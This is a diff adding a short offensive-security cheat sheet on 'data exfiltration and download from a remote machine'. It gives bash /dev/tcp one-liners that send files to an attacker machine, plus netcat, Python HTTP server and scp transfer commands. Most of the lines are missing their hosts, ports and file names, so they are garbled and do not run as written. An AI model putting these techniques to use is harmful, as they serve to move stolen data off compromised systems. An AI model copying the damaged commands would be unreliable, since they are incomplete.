@@ -1,0 +1,57 @@
+File Transfer
+
+Various method of data exfiltration and download from a remote machine.
+
+Bash Upload 
+
+# Upload file over HTTP (require HTTP service running on the attacker machine)
+bash -c 'echo -e "POST / HTTP/0.9 $(<)" > /dev/tcp//'
+
+# Exfiltrate file over TCP# Listen with Netcat on port + output redirection
+nc -l -p > data
+bash -c 'cat > /dev/tcp//' 
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+Bash Download 
+
+# Send via netcat
+nc -l -p <
+
+# Download file on the other machine
+bash -c 'cat < /dev/tcp// > '
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Netcat
+
+# Upload payload
+nc -lnvp
+nc <
+
+# Download
+nc <
+nc -lnvp > file_saved
+
+--------------------------------------------------------------------------------------------------------------------------------------------------
+
+Python
+
+
+# Python3 HTTP Server
+python3 -m http.server
+
+# Python2 HTTP Server
+python -m SimpleHTTPServer 
+
+--------------------------------------------------------------------------------------------------------------------------------------------------
+
+SCP
+
+# Upload from local host to remote computer
+scp username@IP:~/destination
+
+# Download from remote computer
+scp user@IP:~/path_to_file file_saved 
+
